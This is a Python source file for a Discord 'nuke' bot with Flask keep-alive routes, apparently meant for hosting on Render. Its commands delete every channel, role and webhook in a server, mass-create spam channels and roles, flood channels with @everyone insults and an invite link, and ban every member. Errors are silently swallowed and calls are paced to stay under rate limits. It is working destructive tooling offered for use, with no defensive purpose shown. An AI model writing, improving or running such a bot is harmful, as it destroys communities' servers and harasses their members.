# bot.py - Modified to run as Web Service on Render
import discord
from discord.ext import commands
import asyncio
import os
import random
from typing import Dict
from flask import Flask, request, jsonify
import threading
import time

# Flask app for web service
app = Flask(__name__)

TOKEN = os.getenv('DISCORD_TOKEN', '')
PREFIX = os.getenv('COMMAND_PREFIX', '!')
PORT = int(os.getenv('PORT', 10000))

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

class NukeCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.rate_limit_delay = 0.5

    async def cog_check(self, ctx):
        return ctx.author.guild_permissions.administrator

    @commands.command(name='nuke')
    async def nuke_full(self, ctx):
        await ctx.send('🔥 **NUKE SEQUENCE INITIATED** 🔥')
        
        results = {
            'deleted_channels': 0,
            'deleted_roles': 0,
            'deleted_webhooks': 0,
            'created_channels': 0,
            'created_roles': 0,
            'spam_messages': 0,
            'banned_members': 0
        }
        
        await ctx.send('🗑️ Phase 1: Deleting channels...')
        results['deleted_channels'] = await self.delete_all_channels(ctx.guild)
        
        await ctx.send('🗑️ Phase 1: Deleting roles...')
        results['deleted_roles'] = await self.delete_all_roles(ctx.guild)
        
        await ctx.send('🗑️ Phase 1: Deleting webhooks...')
        results['deleted_webhooks'] = await self.delete_all_webhooks(ctx.guild)
        
        await ctx.send('📝 Phase 2: Creating spam channels...')
        results['created_channels'] = await self.create_spam_channels(ctx.guild)
        
        await ctx.send('📝 Phase 2: Creating spam roles...')
        results['created_roles'] = await self.create_spam_roles(ctx.guild)
        
        await ctx.send('💬 Phase 3: Spamming messages...')
        results['spam_messages'] = await self.spam_messages(ctx.guild)
        
        await ctx.send('🔨 Phase 4: Banning members...')
        results['banned_members'] = await self.ban_all_members(ctx.guild)
        
        embed = discord.Embed(
            title='✅ NUKE COMPLETE',
            description='Server destruction sequence finished',
            color=discord.Color.red()
        )
        for key, value in results.items():
            embed.add_field(name=key.replace('_', ' ').title(), value=str(value), inline=True)
        
        await ctx.send(embed=embed)

    @commands.command(name='delete')
    async def delete_channels(self, ctx):
        await ctx.send('🗑️ Deleting all channels...')
        count = await self.delete_all_channels(ctx.guild)
        await ctx.send(f'✅ Deleted {count} channels')

    @commands.command(name='ban')
    async def ban_all(self, ctx):
        await ctx.send('🔨 Banning all members...')
        count = await self.ban_all_members(ctx.guild)
        await ctx.send(f'✅ Banned {count} members')

    @commands.command(name='spam')
    async def spam_channels(self, ctx, count: int = 50):
        await ctx.send(f'📝 Creating {count} spam channels...')
        created = await self.create_spam_channels(ctx.guild, count)
        await ctx.send(f'✅ Created {created} channels')

    @commands.command(name='rolespam')
    async def spam_roles(self, ctx, count: int = 25):
        await ctx.send(f'📝 Creating {count} spam roles...')
        created = await self.create_spam_roles(ctx.guild, count)
        await ctx.send(f'✅ Created {created} roles')

    @commands.command(name='webhook')
    async def delete_webhooks(self, ctx):
        await ctx.send('🗑️ Deleting all webhooks...')
        count = await self.delete_all_webhooks(ctx.guild)
        await ctx.send(f'✅ Deleted {count} webhooks')

    @commands.command(name='status')
    async def server_status(self, ctx):
        guild = ctx.guild
        embed = discord.Embed(
            title=f'📊 Server Status: {guild.name}',
            color=discord.Color.blue()
        )
        embed.add_field(name='Members', value=guild.member_count, inline=True)
        embed.add_field(name='Channels', value=len(guild.channels), inline=True)
        embed.add_field(name='Roles', value=len(guild.roles), inline=True)
        embed.add_field(name='Webhooks', value=len(await guild.webhooks()), inline=True)
        embed.add_field(name='Emojis', value=len(guild.emojis), inline=True)
        embed.add_field(name='Owner', value=guild.owner.mention, inline=True)
        await ctx.send(embed=embed)

    @commands.command(name='help_nuke')
    async def help_nuke(self, ctx):
        embed = discord.Embed(
            title='🔥 NUKE COMMANDS',
            description='All commands require Administrator permission',
            color=discord.Color.red()
        )
        commands_list = [
            ('!nuke', 'Full nuke sequence - destroys everything'),
            ('!delete', 'Delete all channels'),
            ('!ban', 'Ban all members'),
            ('!spam <count>', 'Create spam channels (default: 50)'),
            ('!rolespam <count>', 'Create spam roles (default: 25)'),
            ('!webhook', 'Delete all webhooks'),
            ('!status', 'Show server status'),
            ('!help_nuke', 'Show this help message')
        ]
        for cmd, desc in commands_list:
            embed.add_field(name=cmd, value=desc, inline=False)
        await ctx.send(embed=embed)

    async def delete_all_channels(self, guild):
        count = 0
        for channel in guild.channels:
            try:
                await channel.delete()
                count += 1
                await asyncio.sleep(self.rate_limit_delay)
            except:
                pass
        return count

    async def delete_all_roles(self, guild):
        count = 0
        for role in guild.roles:
            if role.name != '@everyone':
                try:
                    await role.delete()
                    count += 1
                    await asyncio.sleep(self.rate_limit_delay)
                except:
                    pass
        return count

    async def delete_all_webhooks(self, guild):
        count = 0
        webhooks = await guild.webhooks()
        for webhook in webhooks:
            try:
                await webhook.delete()
                count += 1
                await asyncio.sleep(self.rate_limit_delay)
            except:
                pass
        return count

    async def create_spam_channels(self, guild, count: int = 50):
        created = 0
        for i in range(count):
            try:
                await guild.create_text_channel(f'NUKE-{i}')
                created += 1
                await asyncio.sleep(self.rate_limit_delay)
            except:
                pass
        return created

    async def create_spam_roles(self, guild, count: int = 25):
        created = 0
        for i in range(count):
            try:
                await guild.create_role(
                    name=f'NUKE-ROLE-{i}',
                    color=discord.Color(random.randint(0, 0xFFFFFF)),
                    hoist=True,
                    mentionable=True
                )
                created += 1
                await asyncio.sleep(self.rate_limit_delay)
            except:
                pass
        return created

    async def spam_messages(self, guild, count: int = 5):
        sent = 0
        messages = [
            '@everyone SEVER DA BI NUKE',
            '@everyone NUKE ME MAY NEK',
            'https://discord.gg/xnyxd6QEa',
            'THIS SERVER IS DESTROYED',
            'MAY CHET CHUA CON NGU '
        ]
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                for _ in range(count):
                    try:
                        await channel.send(random.choice(messages))
                        sent += 1
                        await asyncio.sleep(self.rate_limit_delay)
                    except:
                        pass
        return sent

    async def ban_all_members(self, guild):
        banned = 0
        bot_member = guild.me
        for member in guild.members:
            if member != bot_member and not member.bot:
                try:
                    await guild.ban(member, reason='NUKE SEQUENCE')
                    banned += 1
                    await asyncio.sleep(self.rate_limit_delay)
                except:
                    pass
        return banned

@bot.event
async def on_ready():
    print(f'✅ Bot logged in as {bot.user}')
    print(f'📡 Connected to {len(bot.guilds)} servers')
    print(f'⚡ Prefix: {PREFIX}')
    print('🔥 Nuke commands ready!')
    print(f'🌐 Web server running on port {PORT}')

# Flask routes to keep web service alive
@app.route('/')
def index():
    return jsonify({
        'status': 'online',
        'bot': str(bot.user),
        'servers': len(bot.guilds),
        'prefix': PREFIX
    })

@app.route('/ping')
def ping():
    return jsonify({'pong': True, 'status': 'alive'})

@app.route('/health')
def health():
    return jsonify({'status': 'healthy'})

async def run_bot():
    """Run the Discord bot"""
    await bot.add_cog(NukeCommands(bot))
    await bot.start(TOKEN)

def run_flask():
    """Run Flask web server in a separate thread"""
    app.run(host='0.0.0.0', port=PORT, debug=False)

if __name__ == "__main__":
    # Start Flask in background thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Run Discord bot
    try:
        asyncio.run(run_bot())
    except KeyboardInterrupt:
        print("Bot stopped")
    except Exception as e:
        print(f"Error: {e}")
